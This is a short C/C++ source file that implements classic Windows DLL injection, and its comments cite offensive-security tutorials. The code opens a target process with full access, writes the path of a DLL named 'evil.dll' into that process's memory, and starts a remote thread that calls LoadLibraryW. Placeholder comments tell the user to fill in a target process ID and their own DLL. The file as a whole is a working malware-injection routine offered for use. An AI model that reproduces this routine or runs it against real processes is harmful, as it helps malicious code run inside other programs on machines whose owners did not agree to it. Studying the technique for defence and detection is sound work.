/*
Title: Classi DLL Injection
Resources:
	- https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
	- https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <Windows.h>

BOOL ClassicDllInjection() {
	DWORD dwPid = 18604; // Replace it with target process ID.
	WCHAR wDllPath[] = L"C:\\evil.dll"; // Replace it with your own DLL to inject.

	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	if (!hKernel32) return FALSE;
	PVOID pLoadLibraryW = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW");
	if (!pLoadLibraryW) return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) return FALSE;

	LPVOID lpRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(wDllPath), MEM_COMMIT, PAGE_READWRITE);
	if (!lpRemoteAddr) {
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, lpRemoteAddr, (LPVOID)wDllPath, sizeof(wDllPath), nullptr)) {
		VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	CreateRemoteThread(hProcess, nullptr, 0, (PTHREAD_START_ROUTINE)pLoadLibraryW, lpRemoteAddr, 0, nullptr);

	CloseHandle(hProcess);

	return TRUE;
}
